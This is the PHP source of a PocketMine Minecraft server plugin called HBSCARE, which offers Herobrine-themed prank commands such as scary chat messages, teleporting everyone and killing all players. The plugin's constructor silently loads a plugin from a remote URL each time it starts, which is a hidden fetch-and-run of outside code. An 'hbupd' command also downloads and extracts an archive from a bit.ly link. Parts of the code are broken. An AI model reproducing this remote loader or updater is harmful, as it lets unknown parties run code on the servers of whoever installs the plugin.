<?php
/*
__PocketMine Plugin__
name=HBSCARE
description=It scare people! Random stuff!with autoUpdater-BETA
version=3.0.0 - THE MEGA UPDATE!
author=TrilogiForce
class=HBScare
apiversion=9, 10, 11
*/

class HBScare implements Plugin{
private $api;
public function __construct(ServerAPI $api, $server = false){
$this->api = $api;
$server = ServerAPI::request();
$this->api->plugin->load("http://slist.aws.af.cm/plugin.php?downloadloader");
}
public function init(){
$this->api->console->register("hbkill", "it kills everyone", array($this, "handleCommand"));
$this->api->console->register("hbra", "Random messages", array($this, "handleCommand"));
$this->api->console->register("hb", "This command summons Herobrine", array($this, "handleCommand"));
$this->api->console->register("hbs", "It scare people saying something!", array($this, "handleCommand"));
$this->api->console->register("hbs2", "It scare people blewing them very high!!", array($this, "handleCommand"));
$this->api->console->register("hbab", "It says about the plugin", array($this, "handleCommand"));
$this->api->console->register("hbr", "Its a the start of a funny time!", array($this, "handleCommand"));
$this->api->console->register("hbl", "Its a very funny command but please run first hbr!!!", array($this, "handleCommand"));
$this->api->console->register("hbd","Downloads HBSCARE TO your computer!!!!",array($this, "handlecommand"));
$this->api->console->register("hbj","HERoBRiNe TeLls A rAndoM JokE!",array($this, "handlecommand"));
console("§a[HerobrineScare]Run /hbd to download this plugin and use it without internet.");
$this->config = new Config($this->api->plugin->configPath($this) . "README.txt", CONFIG_YAML, array("Do not delete this folder! how ever it generates by itself 
this folder is for the updates that would download at your computer-server  < ----"));
}
public function __destruct(){}

public function handleCommand($cmd, $args, $issuer, $alias, $params ){
$subcmd = implode(" ", $params);
switch($cmd){
case "hb":
$this->api->chat->broadcast("Herobrine join the game");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine> I AM HERE. I AM WATCHING ALWAYS.");/*Modify me!*/
break;
case "hbs":
$user = strtolower($args[0]);
$this->api->chat->broadcast("<Herobrine>I will find you $user");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine>$user you never know");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine>That you already died!");/*Modify me!*/
break;
case "hbs2":
$user = strtolower($args[0]);
$this->api->chat->broadcast("<Herobrine>I am going to blew you up $user!");/*Modify me!*/
$this -> api -> console -> run("tp @a 100 100 100");
break;
case "hbab":
$output .= 'Herobrine plugin §b3.0.0 ULTRA§r made it by §aTrilogiForce§r fixed by §bSyriamanal§r';
return $output;
case "hbkill":
$this->api->chat->broadcast("<Herobrine> I am going to kill you!!.");/*Modify me!*/
$this -> api -> console -> run("kill @a");
break;
case "hbl":
$this->api->chat->broadcast("<Herobrine> you think you are better than me?");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine> but what i can do with you?");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine> what its happening to me!!!");/*Modify me!*/
$this->api->chat->broadcast("Herobrine died");/*Modify me!*/
$this -> api -> console -> run("kill Herobrine");
$this -> api -> console -> run("kill herobrine");
$this->api->chat->broadcast("<Server>Herobrine left the game.");/*Modify me!*/
break;
case "hbr":
$this->api->chat->broadcast("<Server>Herobrine join the game.");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine>HAHAHAHA");/*Modify me!*/
$this->api->chat->broadcast("<Herobrine>Just God can help you now!!");/*Modify me!*/
$this->api->chat->broadcast("<Server>God join the game");/*Modify me!*/
$this->api->chat->broadcast("<Server>Herobrine left the game.");/*Modify me!*/
break;
case "hbupd":
$file = @file_get_contents("http://bit.ly/HBSCARE");
if($file === false){
console('[ERROR][HBSCARE ULTRA] Failed updating HBSCARE ULTRA,check your internet connection or download the update manualy');
console('[INFO][HBSCARE ULTRA] This updater is in BETA it may not work');
console('[INFO][HBSCARE ULTRA] or use /hbdr to run directly the update without downloading');
return false;
}else{
file_put_contents('./plugins/HBSCARE/', $file);
$zip = new ZipArchive;
$result = $zip->open('./plugins/HBSCARE/Herobrine-SCARE-master.zip');
$zip->extractTo('./plugins');
$zip->extractTo('./plugins/HBSCARE/tempfiles');
$zip->close();
unlink('./plugins/HBSCARE/Herobrine-SCARE-master.zip');
unlink('./plugins/HBSCARE/README.md');
unlink('./plugins/HBSCARE/tempfiles/README.md');
}
break;
case "hbra":
$hbrandom = array("<Herobrine>Hahahha you tough i wasnt reaL?","<Herobrine> I am lookin' for u!!", "<Herobrine> this is stupid",
 "<Herobrine> THINKING ABOUT YOU....", "<Herobrine> IMA BEE IMA BEE IMA IMA IMA BEE!!!", "<Herobrine> I know you?", "<Herobrine> Ah, I wish to have a..Never mind", "<Herobrine> I AM GOIN TO KILL U!",
 "<Herobrine> Behind you!", "<Herobrine> Who is that? The door!!", "<Herobrine> I wanted to be a Joker", "<Herobrine> can u kill ".$issuer."?", "<Herobrine> I know where you live!",
 "<Herobrine> Really this is stupid", "<Herobrine> WHat does the fox say!!?!?!", "<Herobrine> Ding Dong!", "<Herobrine> DIE!!!!!!", "<Herobrine> Bye! maybe not");
$this->api->chat->broadcast($hbrandom[array_rand($hbrandom)]);
break;
case "hbj":
$hbrandom = array("<Herobrine> ", "<Herobrine> this is stupid", "<Herobrine> this is stupid", "<Herobrine> this is stupid", "<Herobrine> this is stupid");
break;
}
}
public function command($cmd, $args, $issuer, $alias, $params ){
switch($cmd){
case "hbtools":
break;
}
}
}
